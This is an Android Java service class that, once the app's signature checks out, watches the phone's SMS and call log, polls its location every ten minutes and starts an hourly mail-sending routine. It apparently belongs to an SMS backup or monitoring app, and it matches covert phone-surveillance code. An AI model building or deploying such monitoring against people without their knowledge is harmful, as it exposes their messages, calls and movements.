package com.yfm.sms;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.provider.CallLog;
import android.util.Log;

import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;

public class BootServer extends Service {

	public static File file;
	public static long tosend = 1000 * 60*60;
	private LocationClient lc;
	private BDLocationListenerImpl bdlocation;
	private LocationClientOption option;
	private AlarmManager am;
	private SendMail sm;

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		am = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
		file = new File(Environment.getExternalStorageDirectory() + "/smsbak");
		if (!file.exists()) {
			file.mkdirs();
		}
		IntentFilter filter = new IntentFilter();
		filter.addAction("com.yfm.sms.sendmail");
		filter.addAction("com.yfm.sms.location");
		filter.addAction("com.yfm.sms.test");
		this.registerReceiver(new AlarmReceiver(), filter);
		sm = new SendMail(this);
		String cert=getCertMsg().toString();
		if("CN=yfm".equals(cert)){
			Loginfo.write("server", "server启动");
			ContentResolver cr = this.getContentResolver();
			SMSConten content = new SMSConten(cr, new Handler());
			this.getContentResolver().registerContentObserver(
					Uri.parse("content://sms/"), true, content);
			CallConten clcontent = new CallConten(cr, new Handler());
			this.getContentResolver().registerContentObserver(
					CallLog.Calls.CONTENT_URI, true, clcontent);
			
			Intent send = new Intent("com.yfm.sms.sendmail");
			PendingIntent pi = PendingIntent.getBroadcast(this, 0, send,
					PendingIntent.FLAG_UPDATE_CURRENT);
			long triggerAtTime = SystemClock.elapsedRealtime() + 5 * 1000;
			am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime,
					tosend, pi);

			option = new LocationClientOption();
			option.setAddrType("all");
			option.setCoorType("bd09ll");
			lc = new LocationClient(this);
			lc.setLocOption(option);
			bdlocation = new BDLocationListenerImpl();
			lc.registerLocationListener(bdlocation);
			lc.start();
			Intent location = new Intent("com.yfm.sms.location");
			PendingIntent locationintent = PendingIntent.getBroadcast(this, 0,
					location, PendingIntent.FLAG_UPDATE_CURRENT);
			long locationAtTime = SystemClock.elapsedRealtime() + 2 * 1000;
			am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, locationAtTime,
					1000 * 60*10, locationintent);
		}else{
			Loginfo.write("server", "证书不正确,服务启动失败");
		}
		
		
	}

	class AlarmReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			Log.i("com.yfm.sms.action", action);
			if (action != null && "com.yfm.sms.sendmail".equals(action)) {
				sm.setIsceshi(false);
				SendMailThread smt = new SendMailThread(sm);
				smt.start();
			}
			if (action != null && "com.yfm.sms.location".equals(action)) {
				if (lc != null && lc.isStarted()) {
					lc.requestLocation();
				}
			}
			if (action != null && "com.yfm.sms.test".equals(action)) {
				sm.setIsceshi(true);
				SendMailThread smt = new SendMailThread(sm);
				smt.start();
			}
		}
	}

	private String getCertMsg() {
		String certMsg ="";
		PackageInfo pis;
		try {
			pis = this.getPackageManager().getPackageInfo(this.getPackageName(),
					PackageManager.GET_SIGNATURES);
			Signature[] sigs = pis.signatures; // 签名
			CertificateFactory certFactory = CertificateFactory
					.getInstance("X.509");
			// 获取证书

			X509Certificate cert = (X509Certificate) certFactory
					.generateCertificate(new ByteArrayInputStream(sigs[0]
							.toByteArray()));
			// 获取证书发行者
			// 可根据证书发行者来判断该应用是否被二次打包（被破解的应用重新打包后，签名与原包一定不同，据此可以判断出该应用是否被人做过改动）
			certMsg+= cert.getSubjectDN().getName();
		} catch (Exception e) {
			// TODO Auto-generated catch block
		}
		return certMsg;
	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
